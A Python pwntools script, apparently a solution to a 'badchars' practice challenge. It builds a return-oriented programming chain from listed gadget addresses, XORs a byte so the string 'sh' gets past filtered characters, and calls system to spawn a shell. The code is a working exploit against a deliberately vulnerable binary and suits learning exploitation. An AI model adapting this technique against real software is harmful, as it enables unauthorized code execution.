from pwn import *

#[Sections]
#Nm Paddr       Size Vaddr      Memsz Perms Name
#19 0x00000e10     8 0x00600e10     8 -rw- .init_array
#20 0x00000e18     8 0x00600e18     8 -rw- .fini_array
#21 0x00000e20     8 0x00600e20     8 -rw- .jcr
#22 0x00000e28   464 0x00600e28   464 -rw- .dynamic
#23 0x00000ff8     8 0x00600ff8     8 -rw- .got
#24 0x00001000   112 0x00601000   112 -rw- .got.plt
#25 0x00001070    16 0x00601070    16 -rw- .data
#26 0x00001080     0 0x00601080    48 -rw- .bss
write_to = 0x00601070

#  0x00400b34           4d896500  mov qword [r13], r12
#  0x00400b38                 c3  ret
mov_r12_r13_ptr = 0x00400b34

# 0x00400b3b: pop r12; pop r13; ret;
pop_r12_r13 = 0x00400b3b

#  0x00400b30             453037  xor byte [r15], r14b
#  0x00400b33                 c3  ret
xor_r15_ptr_r14b = 0x00400b30

#  0x00400bb0               415e  pop r14
#  0x00400bb2               415f  pop r15
#  0x00400bb4                 c3  ret
pop_r14_r15 = 0x00400bb0

#  0x00400b39                 5f  pop rdi
#  0x00400b3a                 c3  ret
pop_rdi = 0x00400b39

badchars = ELF('badchars')

rop_chain = "Z"*40

# badchars: "bic/fns "
# 0x62 0x69 0x63 0x2f 0x20 0x66 0x6e 0x73
# Prime registers
rop_chain += p64(pop_r12_r13)
rop_chain += "qh" + ("\x00"*6)
rop_chain += p64(write_to)
rop_chain += p64(mov_r12_r13_ptr)

rop_chain += p64(pop_r14_r15)
rop_chain += "\x02"*8
rop_chain += p64(write_to)
rop_chain += p64(xor_r15_ptr_r14b)

rop_chain += p64(pop_rdi)
rop_chain += p64(write_to)

# 0x004006f0    1 6            sym.imp.system
rop_chain += p64(0x004006f0)

p = process(badchars.path)
p.recvuntil('> ')
p.sendline(rop_chain)
p.interactive()
